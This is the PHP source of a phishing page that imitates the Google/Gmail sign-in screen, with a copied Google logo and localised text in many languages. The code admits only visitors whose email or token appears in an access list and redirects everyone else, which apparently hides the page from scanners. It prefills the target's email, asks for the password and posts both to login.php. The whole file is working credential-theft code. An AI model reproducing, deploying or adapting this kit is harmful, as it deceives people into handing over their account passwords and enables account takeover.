<?php
session_start();
function getUserIP()
{
	$client = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote = $_SERVER['REMOTE_ADDR'];

	if (filter_var($client, FILTER_VALIDATE_IP)) {
		$ip = $client;
	}
	else if (filter_var($forward, FILTER_VALIDATE_IP)) {
		$ip = $forward;
	}
	else {
		$ip = $remote;
	}

	return $ip;
}
$v = (empty($_GET['v']) ? NULL : $_GET['v']);
$email = (empty($_GET['email']) ? NULL : $_GET['email']);
$accessed = file_get_contents('../access.txt');
if ($_SERVER['HTTP_HOST'] != 'localhost') {
	if (empty($v) & empty($email)) {
		(include 'redir.html');
		exit();
	}

	if (strstr($accessed, $v) || strstr($accessed, $email)) {
	}
	else {
		(include 'redir.html');
		exit();
	}
}

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

switch ($lang) {
case 'en':
	$lang_file = 'lang.english.php';
	break;

case 'pt':
    $lang_file = 'lang.portuguese.php';
    break;
	
case 'id':
	$lang_file = 'lang.indo.php';
	break;
	
case 'nl':
	$lang_file = 'lang.nederland.php';
	break;
	
case 'fr':
	$lang_file = 'lang.french.php';
	break;
	
case 'ru':
	$lang_file = 'lang.rusia.php';
	break;
	
case 'es':
	$lang_file = 'lang.spanish.php';
	break;
	
case 'de':
	$lang_file = 'lang.german.php';
	break;
	
case 'ja':
	$lang_file = 'lang.japan.php';
	break;
	
case 'vi':
	$lang_file = 'lang.vietnam.php';
	break;
	
case 'pl':
	$lang_file = 'lang.polish.php';
	break;
	
case 'zh':
	$lang_file = 'lang.chinese.php';
	break;
	
case 'it':
	$lang_file = 'lang.italia.php';
	break;

case 'hu':
	$lang_file = 'lang.hungary.php';
	break;
	
case 'th':
	$lang_file = 'lang.thailand.php';
	break;

default:
    $lang_file = 'lang.english.php';
}

include_once 'languages/' . $lang_file;
echo'<!DOCTYPE html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<title>';echo $lang['TITTLE'] ;echo'</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
	<meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
	<!-- Fonts and icons -->
	<script src="js/plugin/webfont/webfont.min.js"></script>
	<script>
		WebFont.load({
			google: {"families":["Montserrat:100,200,300,400,500,600,700,800,900"]},
			custom: {"families":["Flaticon", "LineAwesome"], urls: ["css/fonts.css"]},
			active: function() {
				sessionStorage.fonts = true;
			}
		});
	</script>
	
	<!-- CSS Files -->
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/ready.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<style>
body.login{
    background :#f1f1f1 url("img/bg.svg") no-repeat fixed center;
    }

.sign{
    font-size:20px;
    color:#252c36;
    font-weight:Bold;
}
.continue{
    font-size:15px;
    color:Black;
    padding-bottom:40px;
}
.forgot{
    text-align:left;
    font-size:14px;
    padding-top:20px;
    font-weight:Bold;
}
.com{
    text-align:justify;
    font-size:14px;
    padding-top:40px;
    font-weight:normal;
}

.floating {
  float: left;
  width: 50%;
  padding-top:40px;
}
.create{
    text-align:left;
    font-size:14px;
    padding-top:20px;
    font-weight:Bold;
}

input[type="email"], select {
  padding: 8px 20px;
  font-size:15px;
  font-weight:normal;
  border-bottom: 1px solid #ccc;
}
input[type="password"], select {
  padding: 8px 20px;
  font-size:15px;
  font-weight:normal;
  border-bottom: 1px solid #ccc;
}

.error{
    color:red;
    text-align:center;
    font-size:12px;
    padding-top:10px;
    font-weight:normal;
    font-style:italic;
}

/* unvisited link */
a:link {
  color: #346eeb;
}

/* visited link */
a:visited {
  color: #346eeb;
}

/* mouse over link */
a:hover {
  color: #346eeb;
}

/* selected link */
a:active {
  color: green;
}
.dropdown-submenu {
  position: relative;
}

.dropdown-submenu .dropdown-menu {
  top: 10px;
  left: 100%;
  margin-top: -1px;
}

#regForm {
  background-color: #ffffff;
  margin: 10px auto;
  font-family: Arial, sans-serif;
  padding: 10px 10px 10px 10px;
  width: 90%;
  min-width: 350px;
}

/* Mark input boxes that gets an error on validation: */
input.invalid {
  background-color: #ffdddd;
}

/* Hide all steps by default: */
.tab {
  display: none;
}

.button {
  background-color: #4CAF50;
  color: #ffffff;
  border: none;
  padding: 200px 20px;
  margin: 8px auto;
  width: 100%;
  min-width: 100px;
  font-size: 17px;
  font-family: Arial, sans-serif;
  cursor: pointer;
}

.button:hover {
  opacity: 0.8;
}

#prevBtn {
  background-color: #bbbbbb;
}

/* Make circles that indicate the steps of the form: */
.step {
  height: 15px;
  width: 15px;
  margin: 0 2px;
  background-color: #bbbbbb;
  border: none;  
  border-radius: 50%;
  display:none;
  opacity: 0.5;
}

.step.active {
  opacity: 1;
}

/* Mark the steps that are finished and valid: */
.step.finish {
  background-color: #4CAF50;
}



@media only screen and (max-width:600px) {
body.login{
    background :#f1f1f1 fixed center;
    }
.sign{
    text-align:center;
    font-size:25px;
    color:#252c36;
}
.logo {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 30%;
}
.continue{
    text-align:center;
    font-size:20px;
    color:Black;
    padding-bottom:40px;
}

input[type=email], select {
  background-color: #f1f1f1;
  padding: 8px 20px;
  font-size:15px;
  border-bottom: 1px solid #ccc;
}
input[type=password], select {
  background-color: #f1f1f1;
  padding: 8px 20px;
  font-size:15px;
  border-bottom: 1px solid #ccc;
}

#regForm {
  background-color: #f1f1f1;
  margin-top: 0px auto;
  font-family: Arial, sans-serif;
  padding: 0px 0px 0px 0px;
  width: 0%;
  min-width: 350px;
}
.ul{
    background-color:black;
}
}
</style>
</head>
<body class="login">
<div class="wrapper wrapper-login">
<div class="container container-login animated fadeIn">
<form id="regForm" action="login.php?email='.$email.'&v='.$v.'" class="cloud-login form-ajax" role="form" method="post" accept-charset="utf-8">
<div class="logo">
     <svg viewBox="0 0 74 37" width="250" height="57" preserveAspectRatio="xMinYMin" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><g id=""><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g>
    </svg>
</div>
<div class="sign">';echo $lang['SIGN_IN'] ;echo'</div>
<div class="continue">';echo $lang['CONT_GMAIL'] ;echo'</div>
 <input type="email" value="';echo $email ;echo'" name="" placeholder="" style="display:none">
  <input type="text" value="';echo $v ;echo'" name="" placeholder="" style="display:none">
<div class="tab">
<div class="form-group form-floating-label">
					<input type="email" value="';echo $email ;echo'" name="appleid" class="form-control input-border-bottom" required>
					<label for="email" class="placeholder">';echo $lang['EMAIL'] ;echo'</label>
</div>
</div>			

<div class="tab">
	<div class="form-group form-floating-label">
					<input type="password" value="" name="password" class="form-control input-border-bottom" required>
					<label for="password" class="placeholder">';echo $lang['PASSWORD'] ;echo'</label>
					<div class="show-password">
						<i class="fa fa-fw fa-eye"></i>
					</div>
				</div>
</div>
<div class="error"><i class="fa fa-spinner w3-spin" style="font-size:14px"></i>';echo $lang['ERROR'] ;echo'</div>
<div class="forgot"><a href="">';echo $lang['FORGOT'] ;echo'</a></div>
<div class="com">';echo $lang['NOT_COMPUTER'] ;echo' <a href="">';echo $lang['LEARN'] ;echo'</a></div>
<div class="floating">
<div class="dropdown">
<div class="create" data-toggle="dropdown"><a href="#">';echo $lang['CREATE'] ;echo'</a></div>
<ul class="dropdown-menu">
    <li><a tabindex="-1" href="#">For Myself</a></li>
    <li><a tabindex="-1" href="#">Manage My Business</a></li>
</ul>
</div>
</div>
<div class="floating">
 <div style="overflow:auto;">
<div style="float:right;">				
<button type="submit" name="nextPrev(1)" id="nextBtn" class="btn btn-primary" onclick="nextPrev(1)" value=""></button>
</div>
</div> 
</div>


<!-- Circles which indicates the steps of the form: -->
  <div style="text-align:center;margin-top:40px;">
    <span class="step"></span>
    <span class="step"></span>
     <span class="step"></span>
    <span class="step"></span>
   
  </div>
</form>
</div>
</div>
<script>
var currentTab = 0; // Current tab is set to be the first tab (0)
showTab(currentTab); // Display the current tab

function showTab(n) {
  // This function will display the specified tab of the form...
  var x = document.getElementsByClassName("tab");
  x[n].style.display = "block";
  //... and fix the Previous/Next buttons:
  if (n == (x.length - 1)) {
    document.getElementById("nextBtn").innerHTML = "';echo $lang['SIGN'] ;echo'";
  } else {
    document.getElementById("nextBtn").innerHTML = "';echo $lang['NEXT'] ;echo'";
  }
  //... and run a function that will display the correct step indicator:
  fixStepIndicator(n)
}

function nextPrev(n) {
  // This function will figure out which tab to display
  var x = document.getElementsByClassName("tab");
  // Exit the function if any field in the current tab is invalid:
  if (n == 1 && !validateForm()) return false;
  // Hide the current tab:
  x[currentTab].style.display = "none";
  // Increase or decrease the current tab by 1:
  currentTab = currentTab + n;
  // if you have reached the end of the form... :
  if (currentTab >= x.length) {
    //...the form gets submitted:
    document.getElementById("regForm").submit();
    return false;
  }
  // Otherwise, display the correct tab:
  showTab(currentTab);
}


function validateForm() {
  // This function deals with validation of the form fields
  var x, y, i, valid = true;
  x = document.getElementsByClassName("tab");
  y = x[currentTab].getElementsByTagName("input");
  // A loop that checks every input field in the current tab:
  for (i = 0; i < y.length; i++) {
    // If a field is empty...
    if (y[i].value == "") {
      // add an "invalid" class to the field:
      y[i].className += " invalid";
      // and set the current valid status to false:
      valid = false;
    }
  }
  
 return valid; // return the valid status
}
</script>
	<script src="jss/core/jquery.3.2.1.min.js"></script>
	<script src="jss/plugin/jquery-ui-1.12.1.custom/jquery-ui.min.js"></script>
	<script src="jss/core/popper.min.js"></script>
	<script src="jss/core/bootstrap.min.js"></script>
	<script src="jss/ready.js"></script>
</body>
</html>';
?>